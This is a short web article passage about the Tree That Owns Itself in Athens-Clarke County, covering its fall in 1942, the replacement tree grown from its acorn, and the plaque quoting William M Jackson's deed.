<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>
